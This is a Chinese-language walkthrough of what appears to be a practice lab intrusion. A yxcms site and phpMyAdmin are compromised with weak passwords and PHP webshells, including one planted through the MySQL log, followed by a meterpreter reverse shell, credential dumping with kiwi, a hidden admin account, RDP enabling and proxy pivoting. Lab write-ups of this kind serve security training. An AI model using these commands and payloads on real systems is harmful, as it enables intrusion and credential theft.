<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511124808522.png" alt="image-20210511124808522" style="zoom: 50%;">

<ul>
<li>web服务器(win7): 公网IP:192.168.74.128   内网IP: 192.168.52.143 主机名:stu1</li>
<li>域成员主机(Windows Server 2003)：192.168.52.141 主机名：root-tvi862ubeh</li>
<li>域控(Windows Server 2008)：192.168.52.138 主机名：owa</li>
</ul>
<p>web服务器有两块网卡，其中192.168.74.128模拟的是公网环境，攻击者可以直接访问，192.168.52.143属于内网，攻击者无法直接访问</p>
<h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1><h2 id="网站探测"><a href="#网站探测" class="headerlink" title="网站探测"></a>网站探测</h2><p>首先访问网站主页: <a href="http://192.168.74.129/yxcms">http://192.168.74.129/yxcms</a></p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511130446365.png" alt="image-20210511130446365" style="zoom:67%;">

<p>先扫描一下目录</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511153857974.png" alt="image-20210511153857974" style="zoom:50%;">

<p>可以看存在很多可以访问的目录，并且这些目录都存在目录遍历漏洞，如<code>/public</code>,可以看到该目录下的很多内容，但是没有想要内容</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511154129595.png" alt="image-20210511154129595" style="zoom:50%;">



<h2 id="网站漏洞利用getshell"><a href="#网站漏洞利用getshell" class="headerlink" title="网站漏洞利用getshell"></a>网站漏洞利用getshell</h2><ul>
<li><p>经过探测网站的后台登录页面是<code>http://192.168.74.129/yxcms/index.php?r=admin/index/login</code></p>
<p>经过爆破很容易试出密码为<code>123456</code></p>
<p>成功登录后台</p>
</li>
</ul>
<ul>
<li><p>尝试搜索网站已发现的漏洞</p>
<p>这是一个网站常用的CMS，在网上搜索一下是否存在可以直接利用的漏洞</p>
<p><a href="https://www.freebuf.com/column/162886.html">代码审计| yxcms app 1.4.6 漏洞集合</a></p>
<p>可以看到这个cms还是存在几个很好利用的漏洞的，尝试使用其中文件写入漏洞</p>
<p>访问<code>http://192.168.74.129/yxcms/index.php?r=admin/set/tpadd&amp;Mname=default</code>，这里可以写入php文件</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511155855512.png" alt="image-20210511155855512"></p>
</li>
</ul>
<p>写入一句话木马</p>
<p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210511155949294.png" alt="image-20210511155949294"></p>
<p>写入成功后，访问<code>http://192.168.74.129/yxcms/protected/apps/default/view/default/info.php</code>可以看到已经成功写入一句话木马，之后就是用蚁剑连接</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511160216194.png" alt="image-20210511160216194" style="zoom:50%;">

<p>成功获取shell，并且是system权限，这是由于该网站管理员直接使用<code>administrator</code>登录域控主机，若是在真是环境中获取的是普通用户权限则还需要配合提权，获取system权限</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511160418538.png" alt="image-20210511160418538"></p>
<h2 id="使用phpMyAdmin-Getshell"><a href="#使用phpMyAdmin-Getshell" class="headerlink" title="使用phpMyAdmin Getshell"></a>使用phpMyAdmin Getshell</h2><p>扫描<code>http://192.168.74.129/</code></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511160728113.png" alt="image-20210511160728113"></p>
<p>直接使用工具爆破，很容易得到，用户名和密码都为<code>root</code></p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511132208919.png" alt="image-20210511132208919" style="zoom:50%;">

<p>一开始的想法是利用写<code>into outfile</code>写木马getshell，但是由于网站的<code>secure_file_priv</code>的值为NULL，所以我们不能利用写<code>into outfile</code>写木马getshell</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511161606685.png" alt="image-20210511161606685" style="zoom:50%;">

<p>但是还有一种方法，就是向mysql日志中写入一句话木马，具体如下:<a href="https://blog.csdn.net/qq_36119192/article/details/103461736#%E5%88%A9%E7%94%A8%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6Getshell">mysql日志木马</a></p>
<p>执行下列命令</p>
<pre><code class="hljs mysql">set global general_log&#x3D;on;                                     #开启日志
set global general_log_file&#x3D;&#39;C:&#x2F;phpstudy&#x2F;www&#x2F;yxcms&#x2F;hack.php&#39;;  #设置指定文件为网站日志存放文件
SELECT &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;               		   #执行该语句，会将该命令写入日志文件</code></pre>

<p>执行完命令，便可以在网站根目录下看到<code>hack.php</code></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511162058801.png" alt="image-20210511162058801"></p>
<p>浏览器访问<code>http://192.168.74.129/yxcms/hack.php</code>，一句话木马访问成功</p>
<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210511162146968.png" alt="image-20210511162146968" style="zoom:50%;">

<h1 id="后渗透攻击"><a href="#后渗透攻击" class="headerlink" title="后渗透攻击"></a>后渗透攻击</h1><p>在拿到了Web服务器的权限后，我们就要尽可能多的搜集该服务器的信息，然后搭建隧道通往内网。</p>
<p>执行<code>whoami</code> ,<code>ipconfig</code>,<code>net localgroup administrators</code>命令我们知道当前的用户身份是 <code>administrator</code> ，在管理员组中，并且处在域 god 中。该主机有两张网卡，分别是：192.168.74.129，192.168.52.143</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511162608469.png" alt="image-20210511162608469" style="zoom: 67%;">

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511162902010.png" alt="image-20210511162902010"></p>
<h2 id="获取MSF-shell"><a href="#获取MSF-shell" class="headerlink" title="获取MSF shell"></a>获取MSF shell</h2><p>使用<code>msf</code>生成木马</p>
<ul>
<li><p>kali终端输入<code>msfconsole</code>，进入msf</p>
</li>
<li><p>选择带reverse和meterpreter(发送端接受端连接)的payloads进行反弹端口</p>
<pre><code class="hljs awk">use windows<span class="hljs-regexp">/x64/m</span>eterpreter_reverse_tcp</code></pre>

<p>输入<code>show options</code>查看方法</p>
</li>
<li><p>新开一个终端输入以下命令，生成木马文件，并利用蚁剑上传到目标主机中</p>
</li>
</ul>
<pre><code class="hljs apache"><span class="hljs-attribute">msfvenom</span> -p windows/x<span class="hljs-number">64</span>/meterpreter_reverse_tcp lhost=<span class="hljs-number">192.168.74.130</span> lport=<span class="hljs-number">4444</span> -f exe -o <span class="hljs-number">1</span>.exe</code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511163917527.png" alt="image-20210511163917527" style="zoom: 67%;">

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511164107563.png" alt="image-20210511164107563" style="zoom:67%;">

<ul>
<li><p>再次输入msfconsole 进入应用，输入<code>use exploit/multi/handler</code>进入管理工具，获取shell权限，命令如下</p>
<pre><code class="hljs routeros">use exploit/multi/handler
<span class="hljs-builtin-name">set</span> payload windows/x64/meterpreter_reverse_tcp
<span class="hljs-builtin-name">set</span> lhost kali<span class="hljs-string">&#x27;s ip</span>
<span class="hljs-string">run</span></code></pre>

<p>即可获取shell</p>
</li>
</ul>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511165317518.png" alt="image-20210511165317518" style="zoom:67%;">



<h2 id="获取密码"><a href="#获取密码" class="headerlink" title="获取密码"></a>获取密码</h2><p>在<code>meterpreter</code>中运行<code>run windows/gather/smart_hashdump</code>,但是出现错误，提示需要system进程权限</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511182726579.png" alt="image-20210511182726579" style="zoom:67%;">

<p>使用<code>migrate 388</code>将meterpreter迁移到64位的进程，而且该进程也需要是system权限运行的</p>
<p>再使用<code>run windows/gather/smart_hashdump</code></p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511183026072.png" alt="image-20210511183026072" style="zoom:67%;">

<p>接下来是破解该密码</p>
<p><strong>加载 kiwi模块</strong></p>
<pre><code class="hljs ebnf"><span class="hljs-attribute">load kiwi</span>
<span class="hljs-attribute">creds_all</span></code></pre>

<p>结果如下</p>
<pre><code class="hljs armasm"><span class="hljs-symbol">meterpreter</span> &gt; creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
<span class="hljs-symbol">msv</span> credentials
===============

<span class="hljs-symbol">Username</span>       Domain  LM                                NTLM                              SHA1
--------       ------  --                                ----                              ----
<span class="hljs-symbol">Administrator</span>  GOD     edea194d76c77d87840ac10a764c7362  <span class="hljs-number">8</span>a963371a63944419ec1adf687bb1be5  <span class="hljs-number">343</span>f44056ed02360aead5618dd42e4614b5f70cf
<span class="hljs-symbol">STU1$</span>          GOD                                       cde51539f42c2854d74e82db1173dd8c  <span class="hljs-number">50950</span>d918317edf0ab95661a565c6ebf1151fe3b

<span class="hljs-symbol">wdigest</span> credentials
===================

<span class="hljs-symbol">Username</span>       Domain  Password
--------       ------  --------
(null)         (null)  (null)
<span class="hljs-symbol">Administrator</span>  GOD     hongrisec<span class="hljs-comment">@2019</span>
<span class="hljs-symbol">STU1$</span>          GOD     <span class="hljs-number">81</span> <span class="hljs-built_in">c2</span> <span class="hljs-number">84</span> <span class="hljs-number">7</span>c a6 <span class="hljs-number">0</span>f <span class="hljs-number">51</span> <span class="hljs-number">4</span>b <span class="hljs-number">41</span> <span class="hljs-number">91</span> b3 <span class="hljs-number">1</span>a <span class="hljs-number">0</span>d <span class="hljs-number">7</span>e <span class="hljs-number">56</span> <span class="hljs-number">32</span> <span class="hljs-number">0</span>e <span class="hljs-number">37</span> <span class="hljs-built_in">c7</span> <span class="hljs-number">77</span> <span class="hljs-built_in">f7</span> <span class="hljs-number">54</span> <span class="hljs-number">09</span> <span class="hljs-built_in">f4</span> <span class="hljs-built_in">f2</span> <span class="hljs-number">8</span>b <span class="hljs-number">54</span> cc <span class="hljs-number">6</span>b <span class="hljs-number">20</span> <span class="hljs-number">7</span>e <span class="hljs-number">9</span>c <span class="hljs-number">56</span> <span class="hljs-number">46</span> e5 ee <span class="hljs-built_in">d9</span> <span class="hljs-built_in">d2</span> <span class="hljs-number">84</span> aa <span class="hljs-number">6</span>a <span class="hljs-number">82</span> <span class="hljs-number">82</span> <span class="hljs-number">58</span> b1 ae bf <span class="hljs-number">47</span> db <span class="hljs-number">9</span>f <span class="hljs-number">53</span> <span class="hljs-number">9</span>e <span class="hljs-built_in">c9</span> <span class="hljs-built_in">a1</span> <span class="hljs-number">5</span>f bb ae <span class="hljs-built_in">a2</span> <span class="hljs-built_in">c3</span> <span class="hljs-number">7</span>f <span class="hljs-number">2</span>d <span class="hljs-number">37</span> <span class="hljs-number">9</span>d <span class="hljs-built_in">c1</span> <span class="hljs-number">9</span>a <span class="hljs-number">25</span> <span class="hljs-number">95</span> <span class="hljs-built_in">f6</span> <span class="hljs-number">49</span> b8 <span class="hljs-built_in">a2</span> <span class="hljs-built_in">f1</span> cb <span class="hljs-number">0</span>a ad <span class="hljs-built_in">f2</span> b2 <span class="hljs-number">27</span> <span class="hljs-built_in">c8</span> <span class="hljs-number">36</span> b2 eb a5 <span class="hljs-built_in">d9</span> <span class="hljs-number">3</span>c <span class="hljs-number">10</span> ca <span class="hljs-number">0</span>c <span class="hljs-number">38</span> <span class="hljs-number">18</span> <span class="hljs-number">63</span> fb <span class="hljs-number">0</span>d <span class="hljs-number">7</span>f <span class="hljs-number">67</span> ec <span class="hljs-number">37</span> <span class="hljs-number">87</span> <span class="hljs-number">84</span> e9 cc <span class="hljs-built_in">f3</span> <span class="hljs-built_in">d8</span> <span class="hljs-number">56</span> <span class="hljs-number">72</span> bc <span class="hljs-number">0</span>c cf e8 <span class="hljs-number">20</span> a7 <span class="hljs-number">93</span> <span class="hljs-number">07</span> <span class="hljs-number">29</span> <span class="hljs-number">3</span>d b5 <span class="hljs-number">48</span> b6 <span class="hljs-number">33</span> de e9 df <span class="hljs-number">3</span>a <span class="hljs-number">73</span> <span class="hljs-number">04</span> <span class="hljs-number">94</span> a7 <span class="hljs-number">90</span> e6 <span class="hljs-built_in">d5</span> <span class="hljs-number">4</span>f ce a8 <span class="hljs-number">88</span> <span class="hljs-number">9</span>e a5 <span class="hljs-number">18</span> <span class="hljs-number">78</span> e4 <span class="hljs-number">43</span> e8 <span class="hljs-number">5</span>b e5 <span class="hljs-number">47</span> dc <span class="hljs-number">0</span>a <span class="hljs-number">34</span> be <span class="hljs-number">79</span> <span class="hljs-number">6</span>a fa fe <span class="hljs-number">7</span>f <span class="hljs-built_in">d5</span> <span class="hljs-built_in">c6</span> <span class="hljs-number">38</span> <span class="hljs-number">48</span> <span class="hljs-number">79</span> <span class="hljs-number">53</span> <span class="hljs-number">7</span>b <span class="hljs-number">3</span>f <span class="hljs-number">8</span>f <span class="hljs-number">9</span>e <span class="hljs-number">78</span> <span class="hljs-number">31</span> cf <span class="hljs-number">35</span> <span class="hljs-number">7</span>b <span class="hljs-number">12</span> <span class="hljs-number">93</span> e7 <span class="hljs-number">3</span>a <span class="hljs-built_in">f1</span> <span class="hljs-number">0</span>c de <span class="hljs-number">90</span> <span class="hljs-built_in">d9</span> e5 <span class="hljs-number">69</span> <span class="hljs-number">02</span> a9 ab <span class="hljs-built_in">c6</span> da <span class="hljs-built_in">f2</span> <span class="hljs-number">09</span> <span class="hljs-number">2</span>f <span class="hljs-number">8</span>a <span class="hljs-number">0</span>a ed <span class="hljs-number">19</span> <span class="hljs-number">44</span> <span class="hljs-number">11</span> <span class="hljs-built_in">c4</span> ba <span class="hljs-number">93</span> <span class="hljs-number">12</span> <span class="hljs-number">73</span> <span class="hljs-number">04</span> <span class="hljs-number">69</span> <span class="hljs-number">3</span>a <span class="hljs-number">31</span> <span class="hljs-number">4</span>e ff b8 a7 <span class="hljs-number">72</span> da <span class="hljs-number">4</span>b <span class="hljs-number">6</span>e ad db e9 <span class="hljs-number">52</span> <span class="hljs-number">7</span>f <span class="hljs-number">88</span> cf <span class="hljs-number">0</span>f <span class="hljs-number">01</span> <span class="hljs-number">92</span> <span class="hljs-number">87</span> <span class="hljs-number">68</span> ba <span class="hljs-number">5</span>a <span class="hljs-built_in">d1</span> <span class="hljs-built_in">d3</span> ec <span class="hljs-number">1</span>f <span class="hljs-built_in">c3</span> b1 a5 <span class="hljs-number">3</span>b <span class="hljs-number">44</span> e5 <span class="hljs-number">7</span>b <span class="hljs-number">9</span>d <span class="hljs-number">2</span>f a9 <span class="hljs-number">28</span> <span class="hljs-number">5</span>b

<span class="hljs-symbol">tspkg</span> credentials
=================

<span class="hljs-symbol">Username</span>       Domain  Password
--------       ------  --------
<span class="hljs-symbol">Administrator</span>  GOD     hongrisec<span class="hljs-comment">@2019</span>

<span class="hljs-symbol">kerberos</span> credentials
====================

<span class="hljs-symbol">Username</span>       Domain   Password
--------       ------   --------
(null)         (null)   (null)
<span class="hljs-symbol">Administrator</span>  GOD.ORG  hongrisec<span class="hljs-comment">@2019</span>
<span class="hljs-symbol">stu1$</span>          GOD.ORG  <span class="hljs-number">81</span> <span class="hljs-built_in">c2</span> <span class="hljs-number">84</span> <span class="hljs-number">7</span>c a6 <span class="hljs-number">0</span>f <span class="hljs-number">51</span> <span class="hljs-number">4</span>b <span class="hljs-number">41</span> <span class="hljs-number">91</span> b3 <span class="hljs-number">1</span>a <span class="hljs-number">0</span>d <span class="hljs-number">7</span>e <span class="hljs-number">56</span> <span class="hljs-number">32</span> <span class="hljs-number">0</span>e <span class="hljs-number">37</span> <span class="hljs-built_in">c7</span> <span class="hljs-number">77</span> <span class="hljs-built_in">f7</span> <span class="hljs-number">54</span> <span class="hljs-number">09</span> <span class="hljs-built_in">f4</span> <span class="hljs-built_in">f2</span> <span class="hljs-number">8</span>b <span class="hljs-number">54</span> cc <span class="hljs-number">6</span>b <span class="hljs-number">20</span> <span class="hljs-number">7</span>e <span class="hljs-number">9</span>c <span class="hljs-number">56</span> <span class="hljs-number">46</span> e5 ee <span class="hljs-built_in">d9</span> <span class="hljs-built_in">d2</span> <span class="hljs-number">84</span> aa <span class="hljs-number">6</span>a <span class="hljs-number">82</span> <span class="hljs-number">82</span> <span class="hljs-number">58</span> b1 ae bf <span class="hljs-number">47</span> db <span class="hljs-number">9</span>f <span class="hljs-number">53</span> <span class="hljs-number">9</span>e <span class="hljs-built_in">c9</span> <span class="hljs-built_in">a1</span> <span class="hljs-number">5</span>f bb ae <span class="hljs-built_in">a2</span> <span class="hljs-built_in">c3</span> <span class="hljs-number">7</span>f <span class="hljs-number">2</span>d <span class="hljs-number">37</span> <span class="hljs-number">9</span>d <span class="hljs-built_in">c1</span> <span class="hljs-number">9</span>a <span class="hljs-number">25</span> <span class="hljs-number">95</span> <span class="hljs-built_in">f6</span> <span class="hljs-number">49</span> b8 <span class="hljs-built_in">a2</span> <span class="hljs-built_in">f1</span> cb <span class="hljs-number">0</span>a ad <span class="hljs-built_in">f2</span> b2 <span class="hljs-number">27</span> <span class="hljs-built_in">c8</span> <span class="hljs-number">36</span> b2 eb a5 <span class="hljs-built_in">d9</span> <span class="hljs-number">3</span>c <span class="hljs-number">10</span> ca <span class="hljs-number">0</span>c <span class="hljs-number">38</span> <span class="hljs-number">18</span> <span class="hljs-number">63</span> fb <span class="hljs-number">0</span>d <span class="hljs-number">7</span>f <span class="hljs-number">67</span> ec <span class="hljs-number">37</span> <span class="hljs-number">87</span> <span class="hljs-number">84</span> e9 cc <span class="hljs-built_in">f3</span> <span class="hljs-built_in">d8</span> <span class="hljs-number">56</span> <span class="hljs-number">72</span> bc <span class="hljs-number">0</span>c cf e8 <span class="hljs-number">20</span> a7 <span class="hljs-number">93</span> <span class="hljs-number">07</span> <span class="hljs-number">29</span> <span class="hljs-number">3</span>d b5 <span class="hljs-number">48</span> b6 <span class="hljs-number">33</span> de e9 df <span class="hljs-number">3</span>a <span class="hljs-number">73</span> <span class="hljs-number">04</span> <span class="hljs-number">94</span> a7 <span class="hljs-number">90</span> e6 <span class="hljs-built_in">d5</span> <span class="hljs-number">4</span>f ce a8 <span class="hljs-number">88</span> <span class="hljs-number">9</span>e a5 <span class="hljs-number">18</span> <span class="hljs-number">78</span> e4 <span class="hljs-number">43</span> e8 <span class="hljs-number">5</span>b e5 <span class="hljs-number">47</span> dc <span class="hljs-number">0</span>a <span class="hljs-number">34</span> be <span class="hljs-number">79</span> <span class="hljs-number">6</span>a fa fe <span class="hljs-number">7</span>f <span class="hljs-built_in">d5</span> <span class="hljs-built_in">c6</span> <span class="hljs-number">38</span> <span class="hljs-number">48</span> <span class="hljs-number">79</span> <span class="hljs-number">53</span> <span class="hljs-number">7</span>b <span class="hljs-number">3</span>f <span class="hljs-number">8</span>f <span class="hljs-number">9</span>e <span class="hljs-number">78</span> <span class="hljs-number">31</span> cf <span class="hljs-number">35</span> <span class="hljs-number">7</span>b <span class="hljs-number">12</span> <span class="hljs-number">93</span> e7 <span class="hljs-number">3</span>a <span class="hljs-built_in">f1</span> <span class="hljs-number">0</span>c de <span class="hljs-number">90</span> <span class="hljs-built_in">d9</span> e5 <span class="hljs-number">69</span> <span class="hljs-number">02</span> a9 ab <span class="hljs-built_in">c6</span> da <span class="hljs-built_in">f2</span> <span class="hljs-number">09</span> <span class="hljs-number">2</span>f <span class="hljs-number">8</span>a <span class="hljs-number">0</span>a ed <span class="hljs-number">19</span> <span class="hljs-number">44</span> <span class="hljs-number">11</span> <span class="hljs-built_in">c4</span> ba <span class="hljs-number">93</span> <span class="hljs-number">12</span> <span class="hljs-number">73</span> <span class="hljs-number">04</span> <span class="hljs-number">69</span> <span class="hljs-number">3</span>a <span class="hljs-number">31</span> <span class="hljs-number">4</span>e ff b8 a7 <span class="hljs-number">72</span> da <span class="hljs-number">4</span>b <span class="hljs-number">6</span>e ad db e9 <span class="hljs-number">52</span> <span class="hljs-number">7</span>f <span class="hljs-number">88</span> cf <span class="hljs-number">0</span>f <span class="hljs-number">01</span> <span class="hljs-number">92</span> <span class="hljs-number">87</span> <span class="hljs-number">68</span> ba <span class="hljs-number">5</span>a <span class="hljs-built_in">d1</span> <span class="hljs-built_in">d3</span> ec <span class="hljs-number">1</span>f <span class="hljs-built_in">c3</span> b1 a5 <span class="hljs-number">3</span>b <span class="hljs-number">44</span> e5 <span class="hljs-number">7</span>b <span class="hljs-number">9</span>d <span class="hljs-number">2</span>f a9 <span class="hljs-number">28</span> <span class="hljs-number">5</span>b</code></pre>

<p>可以看到密码已经被破解处理</p>
<pre><code class="hljs angelscript">password：<span class="hljs-symbol">hongrisec@</span><span class="hljs-number">2019</span></code></pre>



<h2 id="远程桌面登录"><a href="#远程桌面登录" class="headerlink" title="远程桌面登录"></a>远程桌面登录</h2><p>已经获得了administrator的账号和密码，现在我们既可以使用administrator账号登录，也可以新建账号登录。</p>
<p>直接使用administrator登录的话可能被管理员发现，所以使用第二种方法</p>
<pre><code class="hljs pgsql">net <span class="hljs-keyword">user</span> hack <span class="hljs-keyword">password</span>  /<span class="hljs-keyword">add</span>
net localgroup administrators hack /<span class="hljs-keyword">add</span></code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511183802017.png" alt="image-20210511183802017" style="zoom: 80%;">

<p>查看主机是否开启<code>3389</code>端口</p>
<pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -p <span class="hljs-number">3389</span> -v <span class="hljs-number">192.168.74.129</span></code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511184005186.png" alt="image-20210511184005186"></p>
<p>可以发现是关闭的。</p>
<p>使用meterpreter,打开该端口(运行之前好像需要重新弹出shell,直接运行没有成功)</p>
<pre><code class="hljs awk">run post<span class="hljs-regexp">/windows/m</span>anage/enable_rdp</code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511184531850.png" alt="image-20210511184531850"></p>
<p>再次扫描就会发现3389端口已经打开</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511184630200.png" alt="image-20210511184630200" style="zoom:67%;">

<p>直接连接即可</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511185014529.png" alt="image-20210511185014529" style="zoom:50%;">

<h2 id="添加路由、挂Socks4a代理"><a href="#添加路由、挂Socks4a代理" class="headerlink" title="添加路由、挂Socks4a代理"></a>添加路由、挂Socks4a代理</h2><ul>
<li><p>添加路由的目的是为了让我们的MSF其他模块能访问内网的其他主机</p>
</li>
<li><p>添加socks4a代理的目的是为了让其他软件更方便的访问到内网的其他主机的服务</p>
</li>
</ul>
<p>注：添加路由一定要在挂代理之前，因为代理需要用到路由功能</p>
<p>在获取<code>shell</code>的机器上添加路由</p>
<pre><code class="hljs routeros">meterpreter &gt; <span class="hljs-builtin-name">run</span> get_local_subnets
meterpreter &gt; <span class="hljs-builtin-name">run</span> autoroute -s 192.168.21.0/24
<span class="hljs-comment"># 添加路由</span>
meterpreter &gt; <span class="hljs-builtin-name">run</span> autoroute -p
<span class="hljs-comment"># 显示路由</span>
meterpreter &gt;<span class="hljs-built_in"> route </span>flush 
<span class="hljs-comment"># 删除</span></code></pre>

<p>使用<code>run post/windows/gather/arp_scanner RHOSTS=192.168.21.0/24</code>，查看存活的主机</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511193307727.png" alt="image-20210511193307727" style="zoom:67%;">

<p>然后建立<code>socks4</code>代理</p>
<pre><code class="hljs pgsql">meterpreter &gt; background
msf5 exploit(multi/<span class="hljs-keyword">handler</span>) &gt; use auxiliary/<span class="hljs-keyword">server</span>/socks4a
msf5 auxiliary(<span class="hljs-keyword">server</span>/socks4a) &gt; <span class="hljs-keyword">set</span> srvhost <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>
msf5 auxiliary(<span class="hljs-keyword">server</span>/socks4a) &gt; <span class="hljs-keyword">set</span> srvport <span class="hljs-number">1080</span>
msf5 auxiliary(<span class="hljs-keyword">server</span>/socks4a) &gt; run</code></pre>



<p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210511195019515.png" alt="image-20210511195019515"></p>
<p>设置完代理后攻击者主机就可以访问内网了</p>
<h2 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h2><pre><code class="hljs jboss-cli">net time <span class="hljs-string">/domain</span>        <span class="hljs-comment">#查看时间服务器</span>
net user <span class="hljs-string">/domain</span>        <span class="hljs-comment">#查看域用户</span>
net view <span class="hljs-string">/domain</span>        <span class="hljs-comment">#查看有几个域</span>
net group <span class="hljs-string">&quot;domain computers&quot;</span> <span class="hljs-string">/domain</span>         <span class="hljs-comment">#查看域内所有的主机名</span>
net group <span class="hljs-string">&quot;domain admins&quot;</span>   <span class="hljs-string">/domain</span>          <span class="hljs-comment">#查看域管理员</span>
net group <span class="hljs-string">&quot;domain controllers&quot;</span> <span class="hljs-string">/domain</span>       <span class="hljs-comment">#查看域控</span></code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511200502702.png" alt="image-20210511200502702"></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511200553874.png" alt="image-20210511200553874"></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511200623757.png" alt="image-20210511200623757"></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511200650884.png" alt="image-20210511200650884"></p>
<p>汇总</p>
<p>从域信息收集可以得到以下信息：</p>
<ul>
<li><p>域：god.org</p>
</li>
<li><p>域内有三个用户：administrator、ligang、liukaifeng01</p>
</li>
<li><p>域内有三台主机：DEV1(不在此环境中)、ROOT-TVI862UBEH、STU1</p>
</li>
<li><p>域控：OWA(192.168.52.138)</p>
</li>
<li><p>域管理员：administrator</p>
</li>
</ul>
<p>由此可见，我们现在获得的即是域管理员权限。此环境内还有一台ROOT-TVI862UBEH(192.168.52.141)和域控OWA(192.168.52.138)。</p>
<h1 id="内网主机信息收集"><a href="#内网主机信息收集" class="headerlink" title="内网主机信息收集"></a>内网主机信息收集</h1><p>远程登录桌面后会看到一个Nmap应用，可以用这个探测内网主机</p>
<p>当然之前已经设置完代理了，也可以使用kali中的msf探测</p>
<h2 id="内网存活主机探测"><a href="#内网存活主机探测" class="headerlink" title="内网存活主机探测"></a>内网存活主机探测</h2><p>在域环境渗透中可以省略，因为使用域命令可以直接查询域中有哪些主机。在非域环境中渗透，可以使用这一步。在这里顺带提一下这个用法。更多的关于使用MSF进行内网探测，传送门：<a href="https://blog.csdn.net/qq_36119192/article/details/92556219">后渗透阶段之基于MSF的内网主机探测</a></p>
<pre><code class="hljs awk">auxiliary<span class="hljs-regexp">/scanner/</span>discovery/udp_sweep    <span class="hljs-comment">#基于udp协议发现内网存活主机</span>
auxiliary<span class="hljs-regexp">/scanner/</span>discovery/udp_probe    <span class="hljs-comment">#基于udp协议发现内网存活主机</span>
auxiliary<span class="hljs-regexp">/scanner/</span>netbios/nbname         <span class="hljs-comment">#基于netbios协议发现内网存活主机</span></code></pre>



<h2 id="内网存活主机端口扫描"><a href="#内网存活主机端口扫描" class="headerlink" title="内网存活主机端口扫描"></a>内网存活主机端口扫描</h2><p><strong>使用MSF自带模块进行端口探测</strong></p>
<pre><code class="hljs awk">auxiliary<span class="hljs-regexp">/scanner/</span>portscan/tcp           <span class="hljs-comment">#基于tcp进行端口扫描(默认扫描1-10000)</span></code></pre>

<p><strong>也可以用nmap扫描</strong></p>
<h2 id="内网存活主机服务探测"><a href="#内网存活主机服务探测" class="headerlink" title="内网存活主机服务探测"></a>内网存活主机服务探测</h2><pre><code class="hljs awk">auxiliary<span class="hljs-regexp">/scanner/</span>ftp/ftp_version            <span class="hljs-comment">#发现内网ftp服务，基于默认21端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>ssh/ssh_version            <span class="hljs-comment">#发现内网ssh服务，基于默认22端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>telnet/telnet_version      <span class="hljs-comment">#发现内网telnet服务，基于默认23端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>dns/dns_amp                <span class="hljs-comment">#发现dns服务，基于默认53端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>http/http_version          <span class="hljs-comment">#发现内网http服务，基于默认80端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>http/title                 <span class="hljs-comment">#探测内网http服务的标题</span>
auxiliary<span class="hljs-regexp">/scanner/</span>smb/smb_version            <span class="hljs-comment">#发现内网smb服务，基于默认的445端口   </span>
auxiliary<span class="hljs-regexp">/scanner/m</span>ssql/mssql_schemadump     <span class="hljs-comment">#发现内网SQLServer服务,基于默认的1433端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>oracle/oracle_hashdump     <span class="hljs-comment">#发现内网oracle服务,基于默认的1521端口 </span>
auxiliary<span class="hljs-regexp">/scanner/my</span>sql/mysql_version        <span class="hljs-comment">#发现内网mysql服务，基于默认3306端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>rdp/rdp_scanner            <span class="hljs-comment">#发现内网RDP服务，基于默认3389端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>redis/redis_server         <span class="hljs-comment">#发现内网Redis服务，基于默认6379端口</span>
